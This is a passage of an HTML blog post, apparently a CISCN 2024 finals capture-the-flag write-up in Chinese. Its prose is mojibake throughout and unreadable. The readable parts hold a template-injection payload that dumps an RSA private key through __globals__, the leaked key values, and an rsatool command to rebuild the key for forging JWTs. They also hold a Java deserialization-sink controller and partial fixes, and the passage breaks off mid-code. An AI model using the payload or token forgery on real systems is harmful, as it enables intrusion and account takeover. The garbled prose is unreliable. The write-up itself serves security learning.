äº†ï¼Œè™½ç„¶ä¸èƒ½ç›´æ¥è°ƒç”¨ï¼Œä½†æ˜¯å¯ä»¥è®¿é—®å±æ€§ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸€ç‚¹è·å–rsakey</p><p>ç°åœ¨æƒ³åŠæ³•åœ¨æ²™ç›’å†…æ‹¿åˆ°ä¸€ä¸ªå…¨å±€å±æ€§ï¼Œæ³¨æ„åˆ°<code>return safer_render_template(&quot;created.html&quot;, share_url=share_url, share_img=share_img)</code>ï¼Œæ„å‘³ç€æˆ‘ä»¬å¯ä»¥ç”¨<code>share_url</code>æˆ–è€…<code>share_img</code>æ¥è·å–å±æ€§ï¼ŒåŒç†ä¸‹é¢çš„<code>info</code>ä¹Ÿå¯ä»¥</p><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240809180407291.png" alt="image-20240809180407291"></p><p>è¿™é‡Œçš„è¯è¦å– info çš„å±æ€§ï¼Œå› ä¸º info æ˜¯è°ƒç”¨<code>Info</code>ç±»å¾—åˆ°çš„ï¼ŒInfoç±»ä¸‹æœ‰<code>parse_avatar</code>è¿™ä¸ªå…¨å±€æ–¹æ³•ï¼Œç„¶åæŸ¥çœ‹styleçš„éœ€è¦åœ¨ &#x2F;showCard è·¯ç”±ä¸‹æŸ¥çœ‹ï¼Œå› ä¸ºè¿™é‡Œæ‰æœ‰infoï¼Œè€Œ &#x2F;createCard åˆ™ä¼šæŠ¥é”™ä½†æ²¡å…³ç³»</p><p>é‚£ä¹ˆè¯»rsakey</p><pre class="line-numbers language-django" data-language="django"><code class="language-django"><span class="token django language-django"><span class="token delimiter punctuation">&#123;&#123;</span><span class="token variable">info</span><span class="token punctuation">.</span><span class="token variable">__class__</span><span class="token punctuation">.</span><span class="token variable">parse_avatar</span><span class="token punctuation">.</span><span class="token variable">__globals__</span><span class="token punctuation">.</span><span class="token variable">rsakey</span><span class="token punctuation">.</span><span class="token variable">__dict__</span><span class="token delimiter punctuation">&#125;&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240809181611924.png" alt="image-20240809181611924"></p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>'_n'<span class="token operator">:</span> Integer(<span class="token number">126123614477015775448789877206017292386336663012480330606083697181136984617708780170725665068837288536687956308850816616924015665300736823691410985286499563938666378049277495278535134451022151639249605836868202071595881433292992822004089702149441937221323083043604617381139486807424885868287782232845765278943</span>)<span class="token punctuation">,</span>'_e'<span class="token operator">:</span> Integer(<span class="token number">65537</span>)<span class="token punctuation">,</span>'_d'<span class="token operator">:</span> Integer(<span class="token number">16356021780675909418180038243647725223789238124159945219053440687588434506704715239803430541832066088977385914352550321608209242708561000115252482779955744104485540020656221986885376506975459291207812710017083944289037938520247378083893059236195153243903078926446378766613488506330804090368443881290180527489</span>)<span class="token punctuation">,</span>'_p'<span class="token operator">:</span> Integer(<span class="token number">9850363198422246262285117823658498388221798522562304025833696072510450569943633244157099881440406495235906124442860453293788140178008982726677547045673409</span>)<span class="token punctuation">,</span>'_q'<span class="token operator">:</span> Integer(<span class="token number">12803955746242662857848752418436052334358986979076848017812570866767671055374254584876363536051804158817416040437466027033560595225841364508826493617684127</span>)<span class="token punctuation">,</span>'_u'<span class="token operator">:</span> Integer(<span class="token number">10145018723854556278558667216207587332906644078393923017778188994804203848464400278734625183772210928560743734943678326043651170472880674685079284970854903</span>)<span class="token punctuation">,</span>'_dp'<span class="token operator">:</span> Integer(<span class="token number">999961340297895911973127986950882551487550934138074807877558935721989527165341592892216389386499601947060186549862682084373292897207589027275977241785025</span>)<span class="token punctuation">,</span>'_dq'<span class="token operator">:</span> Integer(<span class="token number">5244118286473985022664696467883188378455894052098520751546836553485478835899655790885322032358858770327861839227039124427954186139921478037534838971662989</span>)<span class="token punctuation">,</span>'_invq'<span class="token operator">:</span> None<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ¥ä¸‹æ¥æˆ‘ä»¬è¦åšçš„æ˜¯ç”Ÿæˆä¸€ä¸ªrsaç§é’¥ï¼Œä½¿ç”¨å·¥å…·ï¼š<a href="https://github.com/ius/rsatool">https://github.com/ius/rsatool</a></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python3 rsatool.py <span class="token parameter variable">-f</span> PEM <span class="token parameter variable">-o</span> private.pem <span class="token parameter variable">-n</span> <span class="token number">126123614477015775448789877206017292386336663012480330606083697181136984617708780170725665068837288536687956308850816616924015665300736823691410985286499563938666378049277495278535134451022151639249605836868202071595881433292992822004089702149441937221323083043604617381139486807424885868287782232845765278943</span> <span class="token parameter variable">-d</span> <span class="token number">16356021780675909418180038243647725223789238124159945219053440687588434506704715239803430541832066088977385914352550321608209242708561000115252482779955744104485540020656221986885376506975459291207812710017083944289037938520247378083893059236195153243903078926446378766613488506330804090368443881290180527489</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å¾—åˆ°ç§é’¥ï¼Œäºæ˜¯ä¼ªé€ jwt</p><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240809184225259.png" alt="image-20240809184225259"></p><p>å¸¦å›tokenï¼Œå¾—åˆ°base64ç¼–ç åflag</p><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240809184249085.png" alt="image-20240809184249085"></p><hr><h3 id="fix-1"><a href="#fix-1" class="headerlink" title="fix"></a>fix</h3><p>æœ¬é¢˜ç”±@Laffeyä¿®å¤</p><p>åŠ ç›</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/createCard"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"GET"</span><span class="token punctuation">,</span> <span class="token string">"POST"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">create_card</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">"GET"</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> safer_render_template<span class="token punctuation">(</span><span class="token string">"create.html"</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'style'</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token boolean">None</span><span class="token punctuation">:</span>        <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'templates/style.css'</span><span class="token punctuation">,</span><span class="token string">'w'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span>request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'style'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    info<span class="token operator">=</span>Info<span class="token punctuation">(</span><span class="token operator">**</span><span class="token punctuation">&#123;</span><span class="token string">'name'</span><span class="token punctuation">:</span>request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">'avatar'</span><span class="token punctuation">:</span>request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'avatar'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">'signature'</span><span class="token punctuation">:</span>request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'signature'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">'salt'</span><span class="token punctuation">:</span><span class="token builtin">str</span><span class="token punctuation">(</span>os<span class="token punctuation">.</span>urandom<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token comment">#</span>    <span class="token keyword">if</span> <span class="token string">'&#123;'</span> <span class="token keyword">in</span> info<span class="token punctuation">.</span>name<span class="token operator">+</span>info<span class="token punctuation">.</span>avatar<span class="token operator">+</span>info<span class="token punctuation">.</span>signature <span class="token keyword">or</span> <span class="token string">'&#125;'</span> <span class="token keyword">in</span> info<span class="token punctuation">.</span>name<span class="token operator">+</span>info<span class="token punctuation">.</span>avatar<span class="token operator">+</span>info<span class="token punctuation">.</span>signature<span class="token punctuation">:</span>        <span class="token keyword">raise</span> Exception    <span class="token comment">#</span>    <span class="token keyword">if</span> info<span class="token punctuation">.</span>avatar <span class="token keyword">not</span> <span class="token keyword">in</span> os<span class="token punctuation">.</span>listdir<span class="token punctuation">(</span><span class="token string">'avatars'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">raise</span> FileNotFoundError    token <span class="token operator">=</span> jwt<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token builtin">dict</span><span class="token punctuation">(</span>info<span class="token punctuation">)</span><span class="token punctuation">,</span> rsakey<span class="token punctuation">.</span>exportKey<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> algorithm<span class="token operator">=</span><span class="token string">"RS256"</span><span class="token punctuation">)</span>    share_url <span class="token operator">=</span> request<span class="token punctuation">.</span>url_root <span class="token operator">+</span> url_for<span class="token punctuation">(</span><span class="token string">'show_card'</span><span class="token punctuation">,</span> token<span class="token operator">=</span>token<span class="token punctuation">)</span>    qr_img <span class="token operator">=</span> BytesIO<span class="token punctuation">(</span><span class="token punctuation">)</span>    qrcode<span class="token punctuation">.</span>make<span class="token punctuation">(</span>share_url<span class="token punctuation">)</span><span class="token punctuation">.</span>save<span class="token punctuation">(</span>qr_img<span class="token punctuation">,</span><span class="token string">'png'</span><span class="token punctuation">)</span>    qr_img<span class="token punctuation">.</span>seek<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    share_img <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>qr_img<span class="token punctuation">.</span>getvalue<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> safer_render_template<span class="token punctuation">(</span><span class="token string">"created.html"</span><span class="token punctuation">,</span> share_url<span class="token operator">=</span>share_url<span class="token punctuation">,</span> share_img<span class="token operator">=</span>share_img<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è²Œä¼¼è¿™ä¸ªç®—éé¢„æœŸï¼ˆï¼Ÿ</p><p>çœ‹åˆ«çš„å¸ˆå‚…æ˜¯å†™ssti waf</p><hr><h2 id="SolonMaster"><a href="#SolonMaster" class="headerlink" title="SolonMaster"></a>SolonMaster</h2><p>å°±ä¸€ä¸ªæ§åˆ¶å™¨DemoController</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span>demo</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span>demo<span class="token punctuation">.</span></span><span class="token class-name">User</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">BufferedReader</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ByteArrayInputStream</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">FileReader</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ObjectInputStream</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ObjectStreamClass</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Base64</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Map</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>management<span class="token punctuation">.</span></span><span class="token class-name">BadAttributeValueExpException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>json<span class="token punctuation">.</span></span><span class="token class-name">JSONObject</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>noear<span class="token punctuation">.</span>solon<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Controller</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>noear<span class="token punctuation">.</span>solon<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Mapping</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>noear<span class="token punctuation">.</span>solon<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Post</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>noear<span class="token punctuation">.</span>solon<span class="token punctuation">.</span>core<span class="token punctuation">.</span>handle<span class="token punctuation">.</span></span><span class="token class-name">Context</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>noear<span class="token punctuation">.</span>solon<span class="token punctuation">.</span>core<span class="token punctuation">.</span>handle<span class="token punctuation">.</span></span><span class="token class-name">ModelAndView</span></span><span class="token punctuation">;</span><span class="token annotation punctuation">@Controller</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">DemoController</span> <span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@Mapping</span><span class="token punctuation">(</span>value<span class="token operator">=</span><span class="token string">"/"</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> <span class="token class-name">ModelAndView</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">ModelAndView</span> model <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ModelAndView</span><span class="token punctuation">(</span><span class="token string">"freemarker.ftl"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        model<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"msg"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token class-name">Object</span><span class="token punctuation">)</span><span class="token string">"/api"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> model<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/*     * WARNING - Removed try catching itself - possible behaviour change.     */</span>    <span class="token annotation punctuation">@Mapping</span><span class="token punctuation">(</span>value<span class="token operator">=</span><span class="token string">"/log"</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">log</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">String</span> filePath <span class="token operator">=</span> <span class="token string">"./logs/solon.log"</span><span class="token punctuation">;</span>        <span class="token class-name">BufferedReader</span> reader <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token class-name">StringBuilder</span> stringBuilder <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">String</span> line<span class="token punctuation">;</span>            reader <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BufferedReader</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileReader</span><span class="token punctuation">(</span>filePath<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>line <span class="token operator">=</span> reader<span class="token punctuation">.</span><span class="token function">readLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                stringBuilder<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>line<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">lineSeparator</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">finally</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>reader <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    reader<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> stringBuilder<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Mapping</span><span class="token punctuation">(</span>value<span class="token operator">=</span><span class="token string">"/api"</span><span class="token punctuation">)</span>    <span class="token annotation punctuation">@Post</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">api</span><span class="token punctuation">(</span><span class="token class-name">Map</span> map<span class="token punctuation">,</span> <span class="token class-name">Context</span> ctx<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">JSONObject</span> jsonObject <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">JSONObject</span><span class="token punctuation">(</span>ctx<span class="token punctuation">.</span><span class="token function">body</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>map<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> jsonObject<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">User</span> user <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">User</span><span class="token punctuation">)</span><span class="token class-name">DemoController</span><span class="token punctuation">.</span><span class="token function">deserialize</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span>map<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"data"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> user<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token string">"success"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">static</span> <span class="token class-name">Object</span> <span class="token function">deserialize</span><span class="token punctuation">(</span><span class="token class-name">String</span> data<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> decode <span class="token operator">=</span> <span class="token class-name">Base64</span><span class="token punctuation">.</span><span class="token function">getDecoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">decode</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ObjectInputStream</span> ois <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ByteArrayInputStream</span><span class="token punctuation">(</span>decode<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">boolean</span> check <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>            <span class="token keyword">protected</span> <span class="token class-name">Class</span> <span class="token function">resolveClass</span><span class="token punctuation">(</span><span class="token class-name">ObjectStreamClass</span> desc<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span> <span class="token punctuation">&#123;</span>                <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span> targetc <span class="token operator">=</span> <span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">resolveClass</span><span class="token punctuation">(</span>desc<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">this</span><span class="token punctuation">.</span>check <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token class-name">User</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>targetc<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">IllegalArgumentException</span><span class="token punctuation">(</span><span class="token string">"HackerClass:"</span> <span class="token operator">+</span> targetc<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">BadAttributeValueExpException</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>targetc<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">IllegalArgumentException</span><span class="token punctuation">(</span><span class="token string">"HackerClass:"</span> <span class="token operator">+</span> targetc<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>                <span class="token keyword">this</span><span class="token punctuation">.</span>check <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>                <span class="token keyword">return</span> targetc<span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> ois<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä¸€çœ¼ä¸çœŸæ¼æ´ç‚¹åœ¨ååºåˆ—åŒ–ä¸Šï¼Œè¿˜æä¾›äº†<code>resolveClass</code>è¿‡æ»¤ï¼Œçœ‹äº†ä¸‹ä¾èµ–é‡Œé¢æœ‰ä¸ªfastjsonï¼Œä¸çŸ¥é“æ˜¯ä¸æ˜¯æ‰“é‚£ä¸ªï¼Œåæ­£æˆ‘åˆšå¥½æ²¡å­¦è¿™ä¸ªï¼ˆ</p><h3 id="fixï¼ˆFailedï¼‰"><a href="#fixï¼ˆFailedï¼‰" class="headerlink" title="fixï¼ˆFailedï¼‰"></a>fixï¼ˆFailedï¼‰</h3><p>ä¸€ç‚¹å°é—®é¢˜ï¼šåç¼–è¯‘çš„æ—¶å€™è¿˜åç¼–è¯‘å‡ºäº†ä¸€ä¸ªDemoController$1çš„å­ç±»ï¼Œä½†æ˜¯IDEAè¯†åˆ«ä¸åˆ°ï¼Œä¸çŸ¥é“æ€ä¹ˆå›äº‹</p><p>å°è¯•ç»§ç»­é‡å†™resolveClass</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span>demo</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>management<span class="token punctuation">.</span></span><span class="token class-name">BadAttributeValueExpException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>json<span class="token punctuation">.</span></span><span class="token class-name">JSONObject</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>noear<span class="token punctuation">.</span>solon<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Controller</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>noear<span class="token punctuation">.</span>solon<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Mapping</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>noear<span class="token punctuation">.</span>solon<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Post</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>noear<span class="token punctuation">.</span>solon<span class="token punctuation">.</span>core<span class="token punctuation">.</span>handle<span class="token punctuation">.</span></span><span class="token class-name">Context</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>noear<span class="token punctuation">.</span>solon<span class="token punctuation">.</span>core<span class="token punctuation">.</span>handle<span class="token punctuation">.</span></span><span class="token class-name">ModelAndView</span></span><span class="token punctuation">;</span><span class="token annotation punctuation">@Controller</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">DemoController</span> <span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@Mapping</span><span class="token punctuation">(</span>value<span class="token operator">=</span><span class="token string">"/"</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> <span class="token class-name">ModelAndView</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">ModelAndView</span> model <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ModelAndView</span><span class="token punctuation">(</span><span class="token string">"freemarker.ftl"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    